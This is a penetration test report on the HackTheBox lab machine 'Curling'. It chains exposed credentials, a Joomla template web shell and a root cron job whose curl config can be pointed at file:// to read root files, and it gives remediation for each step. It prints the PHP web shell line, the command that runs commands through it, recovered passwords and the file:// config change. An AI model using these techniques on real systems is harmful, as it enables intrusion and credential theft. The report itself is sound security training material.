---
title: "Curling – Penetration Test Report"
date: 2026-01-01
categories:
  - Pentest Reports
tags: [HTB, Linux, Joomla, RCE, Privilege Escalation, Credential Exposure]
description: "Penetration test report for HTB Curling. Critical findings include Joomla template RCE and privileged automation abuse enabling full root compromise from an unauthenticated position."
image:
  path: /assets/img/curling/1-nmap-scan.png
  alt: "Curling – Penetration Test Report"
---

<div style="border-left: 4px solid #e74c3c; padding: 0.5rem 1rem; background: rgba(231,76,60,0.05); margin-bottom: 2rem;">
<strong>Classification:</strong> Portfolio Demonstration &nbsp;|&nbsp;
<strong>Author:</strong> Sam Ireton &nbsp;|&nbsp;
<strong>Date:</strong> 2026-01-01 &nbsp;|&nbsp;
<strong>Version:</strong> 1.0
</div>

---

## Report Information

| Field | Detail |
|---|---|
| **Target** | `10.129.71.236` (Curling) |
| **Platform** | Linux — Ubuntu, Apache 2.4.29, Joomla CMS |
| **Assessment Type** | Black Box — No credentials provided |
| **Engagement Scope** | HTTP (80), SSH (22) |
| **Assessment Date** | 2026-01-01 |
| **Report Author** | Sam Ireton |
| **Related Walkthrough** | [Technical Write-Up](/posts/HTB-Curling-Write-Up/) |

---

## 1. Executive Summary

A black box penetration test was conducted against a Linux web server hosting a Joomla CMS deployment. The assessment simulated an unauthenticated external attacker with no prior knowledge of the environment.

The assessment identified **2 Critical** and **2 High** severity findings. The most significant issues were the exposure of administrative credentials in publicly accessible page content, and a root-level automation process that accepted user-controlled input without validation.

When chained together, these findings allowed complete system compromise from an unauthenticated network position — progressing from anonymous web visitor to root shell without any prior knowledge of the environment.

### Risk Summary

| Severity | Count |
|---|---|
| 🔴 Critical | 2 |
| 🟠 High | 2 |
| 🟡 Medium | 0 |
| 🟢 Low | 0 |
| ℹ️ Informational | 0 |

---

## 2. Scope & Rules of Engagement

### In Scope
- `10.129.71.236` — Linux web server
- Port `80` — Apache / Joomla CMS
- Port `22` — SSH

### Out of Scope
- Denial of service testing
- Social engineering

### Assumptions
- No credentials provided — black box assessment
- Testing conducted from an external network position
- Target represents a production-like environment

---

## 3. Methodology

| Phase | Description |
|---|---|
| **Reconnaissance** | Nmap service/version scan, CMS fingerprinting, CeWL wordlist generation, manual page source review |
| **Vulnerability Identification** | Credential exposure in page source, CMS admin panel capabilities assessment |
| **Exploitation** | Joomla template modification for web shell, reverse shell deployment |
| **Post-Exploitation** | Filesystem enumeration, credential backup identification and offline analysis |
| **Privilege Escalation** | Identification and abuse of root-owned curl automation with writable config |
| **Reporting** | Documentation of findings, risk ratings, and remediation guidance |

---

## 4. Service Overview

| Port | Service | Version | Notes |
|---|---|---|---|
| 22 | SSH | OpenSSH 7.6p1 Ubuntu | Remote access |
| 80 | HTTP | Apache 2.4.29 | Joomla CMS deployment |

---

## 5. Findings Summary

| ID | Title | Severity | CVSS |
|---|---|---|---|
| F-01 | Sensitive Credentials Exposed in Page Source | 🟠 High | 7.5 |
| F-02 | Joomla Admin Template Editor Enables RCE | 🔴 Critical | 9.1 |
| F-03 | Weakly Obfuscated Credential Backup | 🟠 High | 7.2 |
| F-04 | Privileged Automation with User-Controlled Input | 🔴 Critical | 9.3 |

---

## 6. Detailed Findings

---

### F-01 — Sensitive Credentials Exposed in Page Source

| Field | Detail |
|---|---|
| **Severity** | 🟠 High |
| **CVSS Score** | 7.5 |
| **CVSSv3 Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CVE** | N/A |
| **Affected Component** | Public-facing Joomla web page — HTML source |
| **MITRE ATT&CK** | `T1552.001 — Credentials in Files` |

#### Description

A Base64-encoded string was embedded in a comment within the publicly accessible homepage source. Decoding the value (`Q3VybGluZzIwMTgh`) revealed the plaintext credential `Curling2018!`. Combined with a username identified via CeWL wordlist generation from the site content, this credential provided direct administrative access to the Joomla panel.

#### Evidence

```bash
echo "Q3VybGluZzIwMTgh" | base64 -d
# Curling2018!
```

#### Impact

Unauthenticated attackers with access to the web application could obtain valid administrative credentials without any brute force or exploitation, enabling full CMS administrative access.

> **Worst case:** Direct administrative access to the CMS, enabling remote code execution as demonstrated in F-02.

#### Remediation

1. Remove all credentials from application source code and HTML content immediately
2. Rotate the compromised credential and all associated accounts
3. Implement a secrets scanning tool (e.g. TruffleHog, GitLeaks) in the development pipeline
4. Conduct a full audit of all page source and template files for embedded sensitive data

---

### F-02 — Joomla Admin Template Editor Enables Remote Code Execution

| Field | Detail |
|---|---|
| **Severity** | 🔴 Critical |
| **CVSS Score** | 9.1 |
| **CVSSv3 Vector** | `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| **CVE** | N/A — By design feature, insufficient access control |
| **Affected Component** | Joomla Admin Panel — Templates → File Editor |
| **MITRE ATT&CK** | `T1505.003 — Server Software Component: Web Shell` |

#### Description

The Joomla administrative interface provides a built-in PHP file editor for active templates. With administrative credentials obtained via F-01, a PHP command execution primitive was injected into the active template's `error.php` file, establishing a persistent web shell.

```php
system($_GET['cmd']);
```

This provided unauthenticated RCE via URL parameters once deployed.

#### Evidence

```bash
# Confirmed RCE via web shell
curl "http://10.129.71.236/templates/beez3/error.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Impact

Full remote code execution on the underlying web server as the `www-data` service account, enabling reverse shell deployment, filesystem access, and lateral movement.

> **Worst case:** Complete web server compromise from an authenticated admin position — which was itself achieved without credentials (F-01).

#### Remediation

1. Disable the Joomla template file editor via `configuration.php`: set `$config->sef_rewrite` appropriately and restrict file system access
2. Restrict the Joomla admin panel (`/administrator`) to trusted IP addresses via web server or firewall rules
3. Enforce multi-factor authentication on all CMS administrative accounts
4. Monitor admin panel access and template file modifications via web application logging

---

### F-03 — Weakly Obfuscated Credential Backup File

| Field | Detail |
|---|---|
| **Severity** | 🟠 High |
| **CVSS Score** | 7.2 |
| **CVSSv3 Vector** | `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **CVE** | N/A |
| **Affected Component** | `/home/floris/password_backup` |
| **MITRE ATT&CK** | `T1552.001 — Credentials in Files` |

#### Description

A file named `password_backup` was found in the home directory of user `floris`, accessible after achieving initial foothold. The file contained a credential that had been encoded through multiple layers (hex encoding → bzip2 → gzip → bzip2) rather than encrypted. This encoding scheme provides no meaningful security and is trivially reversible. Offline analysis recovered the plaintext SSH credential.

#### Evidence

```bash
# File transferred and decoded offline
# Recovered credential used for successful SSH authentication
ssh floris@10.129.71.236
# Password: 5d<wdCbdZu)|hChXll
```

#### Impact

Lateral movement from `www-data` web server account to the `floris` user account with full SSH access, persistence, and access to user-level files.

> **Worst case:** Persistent authenticated SSH access to the system as a named user account.

#### Remediation

1. Remove credential backup files from user home directories immediately
2. Use a secrets management solution (HashiCorp Vault, OS keychain) for credential storage
3. Rotate the compromised SSH credential
4. Audit all user home directories for sensitive files

---

### F-04 — Privileged Automation with User-Controlled Input

| Field | Detail |
|---|---|
| **Severity** | 🔴 Critical |
| **CVSS Score** | 9.3 |
| **CVSSv3 Vector** | `AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **CVE** | N/A |
| **Affected Component** | `/home/floris/admin-area/input` — root-owned cron process |
| **MITRE ATT&CK** | `T1053.003 — Scheduled Task: Cron` · `T1574 — Hijack Execution Flow` |

#### Description

A root-owned automated process periodically executed `curl` against a URL specified in a configuration file (`input`) located in the `floris` user's home directory. The `input` file was writable by `floris`, meaning the URL passed to the privileged `curl` invocation was entirely user-controlled.

By modifying the `input` file to reference local system files via the `file://` URI scheme, the root process could be coerced into reading arbitrary restricted files and writing their contents to the output `report` file.

```bash
echo 'url = "file:///root/root.txt"' > /home/floris/admin-area/input
# On next cron execution:
cat /home/floris/admin-area/report
# [root flag]
```

#### Impact

Arbitrary file read as root, enabling retrieval of sensitive system files, credentials, SSH keys, and shadow file contents. With write primitives this would constitute full privilege escalation.

> **Worst case:** Full root compromise. Extension to write arbitrary files (e.g. adding SSH key to `/root/.ssh/authorized_keys`) would provide persistent root access.

#### Remediation

1. Change ownership of the `input` configuration file to `root:root` and remove write permissions for all other users (`chmod 600`)
2. Validate and sanitise all URLs against a strict allowlist before passing to curl — reject `file://`, `gopher://`, and other non-HTTP schemes
3. Run the automation process as a dedicated low-privilege service account rather than root
4. Audit all cron jobs and their associated configuration files for similar user-controlled input patterns

---

## 7. Attack Chain Narrative

The engagement began with unauthenticated web enumeration. Manual review of the homepage source revealed a Base64-encoded string that decoded to a valid administrative password. Combined with a username identified from page content, this provided immediate Joomla admin panel access without any brute force.

With administrative CMS access, the built-in template file editor was used to deploy a PHP web shell, achieving remote code execution as `www-data`. A reverse shell was established and stabilised.

Filesystem enumeration identified an obfuscated credential backup file in the `floris` home directory. Offline decoding of the multi-layer encoded file recovered the SSH password for `floris`, enabling persistent authenticated shell access.

Final enumeration revealed a root-owned cron job consuming a user-writable configuration file. Modifying the URL parameter to reference `/root/root.txt` via `file://` resulted in the root flag being written to the readable output file on the next cron execution.

### Attack Chain

```
[Unauthenticated]
      │
      ▼
[F-01: Base64 credentials in page source] ── Admin panel access
      │
      ▼
[F-02: Joomla template RCE] ────────────── www-data shell
      │
      ▼
[F-03: Weakly obfuscated credential backup] SSH as floris
      │
      ▼
[F-04: Privileged curl automation abuse] ── Root file read → Full compromise
```

**Key Observation:** No individual finding required advanced exploitation. The chain succeeded entirely through credential exposure, a by-design CMS feature, and a configuration oversight — reflecting real-world scenarios where defence-in-depth failures enable full compromise.

---

## 8. Business Impact

If these vulnerabilities existed in a production environment:

- **Confidentiality:** Complete exposure of all system data, user credentials, and application secrets
- **Integrity:** Ability to modify application content, configuration, and system files
- **Availability:** Potential for service disruption, data destruction, or ransomware deployment
- **Compliance:** Likely violations of GDPR, PCI-DSS, or ISO 27001 depending on data handled
- **Reputational:** Public-facing credential exposure and server compromise would carry significant disclosure obligations

---

## 9. Remediation Roadmap

### Immediate *(24–72 hours)*
- [ ] Remove Base64-encoded credentials from page source
- [ ] Rotate all exposed credentials (Joomla admin, floris SSH)
- [ ] Change ownership of `admin-area/input` to root, remove user write access
- [ ] Restrict Joomla `/administrator` to trusted IPs

### Short-Term *(30 days)*
- [ ] Disable Joomla template file editor
- [ ] Enforce MFA on all CMS admin accounts
- [ ] Audit all user home directories for sensitive files
- [ ] Implement web application logging and alerting

### Long-Term
- [ ] Secrets scanning in CI/CD pipeline
- [ ] Privileged process audit — all cron jobs, config file ownership
- [ ] Adopt secrets management solution
- [ ] Regular penetration testing cadence

---

## 10. Appendices

### Appendix A — Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port and service enumeration |
| CeWL | Custom wordlist generation from web content |
| joomscan | Joomla CMS enumeration |
| netcat | Reverse shell handler |
| python3 | Shell stabilisation, HTTP file server |

### Appendix B — References
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [MITRE ATT&CK — T1552.001](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK — T1505.003](https://attack.mitre.org/techniques/T1505/003/)
- [MITRE ATT&CK — T1053.003](https://attack.mitre.org/techniques/T1053/003/)

---

<div style="border-top: 1px solid #444; padding-top: 1rem; margin-top: 2rem; font-size: 0.85rem; color: #888;">
<strong>Disclaimer:</strong> This report was produced against a deliberately vulnerable HackTheBox environment for educational and portfolio demonstration purposes. No unauthorized testing was performed against real-world systems.
</div>
